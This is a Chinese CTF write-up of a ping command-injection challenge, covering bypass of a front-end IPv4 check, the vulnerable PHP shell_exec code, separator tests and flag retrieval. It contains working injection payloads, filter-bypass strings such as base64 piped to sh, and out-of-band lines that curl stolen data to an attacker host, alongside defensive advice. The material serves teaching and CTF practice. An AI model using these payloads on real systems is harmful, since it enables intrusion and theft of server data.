---
title: "Ping 命令注入 题解"
date: 2026-11-08
pinned: false
description: "Ping 命令注入 · HackBar 实战与原理问答"
tags: [ctf, web, WriteUp]
categories: [web]
draft: false
cover: /hero/bg-11-kimi.jpg
---

# Ping 命令注入 · HackBar 实战与原理问答

| 项目 | 内容 |
|---|---|
| 靶场 | `http://node5.anna.nssnode.cn:21337/`（看看能ping出什么东西捏？） |
| 题型 | Web / 命令注入（Command Injection） |
| 入口参数 | POST `command` |
| 校验情况 | **仅前端 JS 正则**校验 IPv4，服务端零过滤 |
| 执行函数 | `shell_exec('ping -c 6 ' . $_POST['command'])` |
| 工具 | 浏览器 + HackBar（POST 模式） |
| 结果 | `NSSCTF{dc137b28-a0e8-4cec-a615-d2b630002621}` |

> 靶场为平台临时实例，做完失效，复现请换自己的地址。

---

## 一、题目长什么样

一个极简页面：一个输入框 + 一个 PING 按钮，提交后把命令输出贴在页面下方。

正常输入 `127.0.0.1`：

```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.055 ms
...
--- 127.0.0.1 ping statistics ---
6 packets transmitted, 6 packets received, 0% packet loss
```

这个“把命令执行结果原样贴回来”的行为，就是命令注入最典型的特征：**页面在帮你执行命令**。

### 1.1 前端有个正则，只允许 IPv4

```javascript
function check_ip(){
  let ip = document.getElementById('command').value;
  let re = /^(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)$/;
  if(re.test(ip.trim())){
    return true;
  }
  alert('敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦');
  return false;
}
```

在页面上手打 `127.0.0.1;id`，会被 `alert` 拦下，表单根本不提交。

### 1.2 服务端源码（注入后读出来的）

```php
<?php
    header("Content-Type: text/html; charset=utf-8");
    error_reporting(0);
    if(!isset($_POST['command'])) {
        die();
    }
    $command = $_POST['command'];
    $command = 'ping -c 6 ' . $command;
    echo '' . str_replace("\n", "<br>\n", shell_exec($command)) . '';
?>
```

逐行看关键点：

| 代码 | 含义 |
|---|---|
| `$_POST['command']` | 拿用户输入，**没有任何过滤** |
| `'ping -c 6 ' . $command` | 前面拼了固定命令，你的输入接在后面 |
| `shell_exec(...)` | 把整串交给 `/bin/sh -c` 执行，**shell 元字符全部生效** |
| `error_reporting(0)` | 隐藏 PHP 报错，但不影响命令输出 |
| `str_replace("\n","<br>")` | 把换行转成 `<br>`，方便网页显示 |

**结论：前端那道正则就是全部的“防护”，服务端裸奔。**

---

## 二、判断思路：前端校验等于没有校验

这是本题最核心的认知转变。

| 校验位置 | 能不能绕过 | 怎么绕 |
|---|---|---|
| 前端 JS（`onsubmit`、`alert`） | ✅ 随便绕 | 抓包改包 / HackBar 直接发 / 禁用 JS |
| 后端 PHP（`preg_match`、`str_replace`） | 要看具体写法 | 变形、编码、换连接符 |

**为什么前端校验形同虚设**：浏览器只是“帮用户跑 JS”，请求最终是**你自己发出去的**。你完全可以不走那个表单，直接构造一个 POST 请求——服务器根本不知道你有没有经过 JS。

```bash
curl "http://目标/" --data-urlencode "command=127.0.0.1;id"
```

上面这条命令里，`check_ip()` 从头到尾没被执行过一次。

### 2.1 三种绕过方式的对比

| 方式 | 操作 | 优点 | 缺点 |
|---|---|---|---|
| 禁用 JS | F12 → Settings（`F1`）→ Debugger → 勾 `Disable JavaScript` | 最简单 | 页面刷新后要重开，且看不到报错提示 |
| **HackBar** | 拨开 `Use POST method`，Body 填参数 | 干净、可复用、留历史 | 需要装扩展 |
| Burp Repeater | 抓包 → 改 `command` 参数 | 最灵活，可改任意 Header | 步骤稍多 |

> 我截图里在 DevTools Settings 里勾 `Disable JavaScript`，思路是对的，但用 HackBar 更省事——它压根不经过页面 JS。

---

## 三、HackBar 操作步骤（本题完整流程）

| 步 | 操作 | 要点 |
|---|---|---|
| 1 | 打开 `http://node5.anna.nssnode.cn:21337/`，`F12` → **HackBar** | — |
| 2 | 点 **LOAD**，把当前 URL 灌进 `URL` 框 | 这题 URL 是根路径，没有查询串 |
| 3 | **拨开 `Use POST method` 开关** | ⚠️ 最容易漏的一步。不拨就是 GET，后端 `isset($_POST['command'])` 为 false，直接 `die()` |
| 4 | 在 `Body` 框填参数：`command=127.0.0.1\|id` | `enctype` 保持默认 `application/x-www-form-urlencoded` |
| 5 | 点 **EXECUTE** | 回显里应出现 `uid=82(www-data)` |

### 3.1 为什么要拨 POST 开关

源码第一行逻辑就是：

```php
if(!isset($_POST['command'])) { die(); }
```

只认 POST。HackBar 默认是 GET，不拨开关就会出现“页面一片空白、什么反应都没有”——不是 payload 错，是**请求方法错**。

### 3.2 拿到回显之后

```
command=127.0.0.1|id          → uid=82(www-data) gid=82(www-data)
command=127.0.0.1|ls -la /    → 根目录列表
command=127.0.0.1|cat /flag   → flag
```

---

## 四、为什么必须加连接符

源码把命令拼成：

```
ping -c 6 【你的输入】
```

如果不加连接符，你的输入只是 ping 的**一个参数**（主机名）。想执行别的命令，必须先用 shell 元字符“断开”ping：

```bash
ping -c 6 127.0.0.1 ; id
                   ↑ 这里断开，id 成为第二条命令
```

---

## 五、8 种连接符实测（本题真实结果）

| 连接符 | 写法 | 结果 | 原因 |
|---|---|---|---|
| `;` | `127.0.0.1;id` | ✅ 执行 | 顺序执行，前一条结束就跑后一条 |
| `\|` | `127.0.0.1\|id` | ✅ 执行 | 管道，id 的 stdout 直接回显 |
| `&` | `127.0.0.1&id` | ✅ 执行 | 放入后台，两条都会跑 |
| `&&` | `127.0.0.1&&id` | ✅ 执行 | 前一条**成功**才执行后一条，ping 成功 → 执行 |
| `\|\|` | `127.0.0.1\|\|id` | ❌ 不执行 | 前一条**失败**才执行后一条，ping 成功 → 跳过 |
| `` `id` `` | `` 127.0.0.1`id` `` | ❌ 无输出 | 命令替换：`id` 的结果被塞进命令行当参数，不是打印 |
| `$()` | `127.0.0.1$(id)` | ❌ 无输出 | 同上，替换而非执行 |
| `%0a` | 换行分隔 | ❌ 未生效 | 实测被吃掉（PHP/解析层处理） |

### 5.1 `||` 为什么不行——最容易踩的坑

`||` 的语义是“**前面失败才执行后面**”：

```
ping -c 6 127.0.0.1 || id
     └─ 成功（exit 0）──→ 短路，id 永远不执行
```

对比 `&&`：“前面成功才执行后面”，ping 成功 → id 就执行了。

**记忆法**：`&&` 是“顺利就继续”，`||` 是“出事了才补救”。ping 这种命令几乎永远成功，所以 `&&` 好用、`||` 没用。

### 5.2 反引号和 `$()` 为什么没输出

它们不是“执行并输出”，而是**命令替换**——把结果当**文本**插进命令里：

```bash
ping -c 6 127.0.0.1`id`
# 替换后变成：
ping -c 6 127.0.0.1uid=82(www-data) gid=82(www-data)...
#                                    ↑ ping 认为这是主机名 → 报错
```

`id` 确实执行了，但它的输出被当成 ping 的参数，不会出现在页面上。**要看到输出，必须用 `;` `|` `&&` 这类“真正执行第二条命令”的符号。**

---

## 六、拿 flag

```
POST command=127.0.0.1|cat /flag
→ flag=NSSCTF{dc137b28-a0e8-4cec-a615-d2b630002621}
```

顺带看一眼根目录和 webroot：

```
127.0.0.1|ls -la /                → /flag（50 字节）
127.0.0.1|ls /var/www/html/       → index.php  upload/  zz.php
```

| 发现 | 结论 |
|---|---|
| `zz.php` | 0 字节空文件，**干扰项** |
| `upload/` | 空目录，**干扰项** |
| `/flag` | 真正的目标，50 字节 |

---

## 七、和上一道 SQL 题的共性

| 维度 | SQL 注入题 | 本题 |
|---|---|---|
| 前端有没有提示 | 有（源码直接贴出来） | 有（`alert` 提示只许输 IP） |
| 后端有没有防 | 没有（括号只是拼接，不是过滤） | 没有（`shell_exec` 直接接管） |
| 突破点 | 闭合括号 + 注释 | 换连接符 + 绕过前端 |
| 一句话 | **前端校验 = 没有校验** | 同上 |

以后看到页面里的 `alert()`、`onsubmit="return xxx"`，第一反应就该是：**抓包改一下试试**，而不是琢磨怎么骗过那段 JS。

---

## 八、延伸：这题没触发，但同类题会遇到

### 8.1 如果服务端过滤了关键符号

| 被过滤 | 绕过写法 |
|---|---|
| 空格 | `cat${IFS}/flag`、`cat$IFS/flag`、`cat</flag`、`{cat,/flag}` |
| `;` `\|` `&` | 换行 `%0a`、`` ` `` 反引号、`$()`（前提是能输出） |
| `flag` 关键词 | `cat /fla?`、`cat /f*`、`cat /fla[g]` |
| `cat` | `/bin/ca?`、`tac`、`more`、`less`、`head`、`sort`、`nl` |
| 整串被 `preg_match` 拦 | `base64` 编码后 `echo xxx\|base64 -d\|sh` |
| 长度限制 | 分段写入临时文件，再执行 |

### 8.2 如果没有回显（盲命令注入）

| 手法 | payload 思路 |
|---|---|
| 时间盲注 | `127.0.0.1;sleep 5` —— 看响应是否变慢 |
| DNS 带外 | `127.0.0.1;curl http://你的域名/$(whoami)` |
| HTTP 带外 | `127.0.0.1;curl http://公网IP/?d=$(cat /flag\|base64)` |
| 写文件 | `127.0.0.1;cat /flag > /var/www/html/o.txt` 再去访问 |

### 8.3 防守视角

| 层面 | 措施 |
|---|---|
| 根本方案 | **不调用 shell**：PHP 用 `filter_var($ip, FILTER_VALIDATE_IP)` 校验，再用 `escapeshellarg()` 转义 |
| 更好的方案 | 用语言内置库（如 `Net/Ping`）替代 `shell_exec` |
| 权限 | Web 进程最小权限、`disable_functions` 禁用 `shell_exec/system/exec` |
| 架构 | 命令执行放独立沙箱/容器，隔离 flag 与业务 |

---

## 九、总结表

| # | 环节 | 本题做法 | 通用方法论 |
|---|---|---|---|
| 1 | 识别题型 | 输入框 + 命令输出回显 | 页面在“帮你执行命令”就是命令注入 |
| 2 | 看校验 | 只有前端 JS 正则 | 前端校验一律视为可绕过 |
| 3 | 绕过 | HackBar 直接 POST | 拨开 `Use POST method`，别用 GET |
| 4 | 断开命令 | `;` `\|` `&&` `&` | `\|\|` 因 ping 成功而短路，慎用 |
| 5 | 读数据 | `\|cat /flag` | 输出经 `<br>` 转换，注意解析 |
| 6 | 排除干扰 | `zz.php` 空、`upload/` 空 | 先 `ls /` 看真正目标 |
| 7 | 工具 | HackBar：POST + Body | 完全绕开页面 JS |
| 8 | 没回显怎么办 | 本题有回显，未触发 | 时间盲注 / DNS 带外 / 写文件 |

**一句话收束**：这题考的不是“怎么绕过前端”，而是**“意识到前端不算防线”**——只要你能自己构造请求，浏览器上的任何提示都只是装饰。真正该看的是服务端那句 `shell_exec`。
